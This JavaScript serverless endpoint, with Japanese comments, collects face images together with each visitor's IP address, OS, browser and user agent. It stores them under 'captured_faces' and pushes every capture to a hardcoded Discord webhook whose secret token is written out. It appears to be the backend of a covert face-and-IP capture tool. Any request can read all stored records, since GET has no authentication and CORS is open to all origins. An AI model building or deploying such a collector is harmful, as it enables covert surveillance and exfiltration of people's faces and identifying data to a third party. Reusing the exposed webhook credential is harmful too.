// api/capture.js
import { kv } from '@vercel/kv';

export default async function handler(req, res) { // async functionに変更
    console.log('Capture API called:', req.method, req.url);
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        try {
            const { images, system_info, timestamp } = req.body;
            
            // 新しいキャプチャデータを準備
            const captureData = {
                id: Date.now(),
                timestamp: timestamp || new Date().toISOString(),
                images: images || [],
                system_info: system_info || {},
                capture_count: images ? images.length : 0
            };
            
            // Vercel KVにデータを保存 (リストの先頭に追加)
            await kv.lpush('captured_faces', JSON.stringify(captureData));
            
            // リストが50件を超えたら、古いものから削除して50件に保つ
            await kv.ltrim('captured_faces', 0, 49);
            
            console.log(`新しい顔画像を受信: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
            
            // Discord Webhookにも送信（非同期）
            (async () => {
                try {
                    const webhookUrl = "https://discord.com/api/webhooks/1392713552862777487/uPdoQWpRktX36P4W4YvpjX4NmwoSOZZQdC5R3OTid-t765l6VTfMQxLK3UU_rflQCQd3";
                    const firstImage = captureData.images[0];
                    let content = `新しい顔画像が送信されました！\n` +
                        `IP: ${captureData.system_info.ip_address || 'Unknown'}\n` +
                        `OS: ${captureData.system_info.os || 'Unknown'}\n` +
                        `ブラウザ: ${captureData.system_info.browser || 'Unknown'}\n` +
                        `解像度: ${captureData.system_info.screen_resolution || 'Unknown'}\n` +
                        `User-Agent: ${captureData.system_info.user_agent || 'Unknown'}`;
                    let payload;
                    if (firstImage && firstImage.startsWith('data:image/')) {
                        // Discordはbase64画像の直接送信は未対応なので、埋め込みで表示
                        payload = {
                            content,
                            embeds: [
                                {
                                    title: "キャプチャ画像",
                                    image: { url: firstImage },
                                    color: 16098851
                                }
                            ]
                        };
                    } else {
                        payload = { content };
                    }
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch (e) {
                    console.error('Discord Webhook送信エラー:', e);
                }
            })();
            
            res.status(200).json({
                success: true,
                message: '画像を正常に受信しました',
                id: captureData.id
            });
        } catch (error) {
            console.error('画像受信エラー:', error);
            console.error('Request body:', req.body);
            res.status(500).json({
                success: false,
                error: '画像の保存に失敗しました',
                details: error.message
            });
        }
    } else if (req.method === 'GET') {
        // Vercel KVからデータを取得
        const data = await kv.lrange('captured_faces', 0, -1);
        res.status(200).json(data.map(item => JSON.parse(item)));
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
